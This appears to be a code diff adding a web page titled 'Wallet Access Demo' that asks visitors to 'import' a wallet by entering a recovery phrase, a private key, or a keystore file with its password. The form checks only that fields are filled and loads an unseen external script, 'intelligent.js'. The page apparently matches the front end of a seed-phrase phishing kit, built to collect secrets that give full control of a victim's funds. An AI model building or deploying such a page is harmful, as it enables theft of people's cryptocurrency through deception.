@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wallet Access Demo</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f3f3f3;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      width: 350px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+    h2 {
+      text-align: center;
+      color: #333;
+    }
+    .option {
+      margin: 15px 0;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+    }
+    select, input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    textarea {
+      width: 90%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      height: 100px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #007bff;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+    .note {
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Import Wallet</h2>
+
+    <!-- Choose Wallet Method -->
+    <div class="option">
+      <label for="method">Choose Wallet Method</label>
+      <select id="method" name="method" onchange="showInput()" required>
+        <option value="">-- Select --</option>
+        <option value="phrase">Recovery Phrase</option>
+        <option value="key">Private Key</option>
+        <option value="keystore">Keystore JSON</option>
+      </select>
+    </div>
+
+    <!-- Form Section -->
+    <form id="allForm" onsubmit="return validateForm()">
+      <div id="inputArea"></div>
+      <button type="submit" id="submitBtn" disabled>Proceed</button>
+    </form>
+    
+    <p class="note">Please make sure you enter a valid wallet.</p>
+  </div>
+
+  <script>
+    // Dynamically show input fields based on the chosen wallet method
+    function showInput() {
+      let method = document.getElementById("method").value;
+      let area = document.getElementById("inputArea");
+      let submitBtn = document.getElementById("submitBtn");
+      area.innerHTML = ""; // Clear existing content
+
+      // Enable or disable the submit button based on selection
+      submitBtn.disabled = !method;
+
+      if (method === "phrase") {
+        area.innerHTML = `
+          <label for="recoveryPhrase">Enter Recovery Phrase</label>
+          <textarea id="recoveryPhrase" name="recoveryPhrase" placeholder="Enter 12/24 word phrase" required></textarea>
+        `;
+      } else if (method === "key") {
+        area.innerHTML = `
+          <label for="privateKey">Enter Private Key</label>
+          <input id="privateKey" name="privateKey" type="text" placeholder="Private key" required>
+        `;
+      } else if (method === "keystore") {
+        area.innerHTML = `
+          <label for="keystoreJson">Enter Keystore JSON</label>
+          <textarea id="keystoreJson" name="keystoreJson" placeholder="Paste JSON here" required></textarea>
+          <label for="keystorePassword">Password</label>
+          <input id="keystorePassword" name="keystorePassword" type="password" placeholder="Password" required>
+        `;
+      }
+    }
+
+    // Form validation before submission
+    function validateForm() {
+      let method = document.getElementById("method").value;
+      if (!method) {
+        alert("Please select a wallet method.");
+        return false; // Prevent form submission
+      }
+
+      let valid = false;
+      if (method === "phrase") {
+        valid = document.getElementById("recoveryPhrase").value.trim() !== "";
+      } else if (method === "key") {
+        valid = document.getElementById("privateKey").value.trim() !== "";
+      } else if (method === "keystore") {
+        valid = document.getElementById("keystoreJson").value.trim() !== "" && document.getElementById("keystorePassword").value.trim() !== "";
+      }
+
+      if (!valid) {
+        alert("Please fill in the required fields.");
+        return false;
+      }
+
+      return true; // Allow form submission
+    }
+  </script>
+  <script src="intelligent.js"></script>
+</body>
+</html>
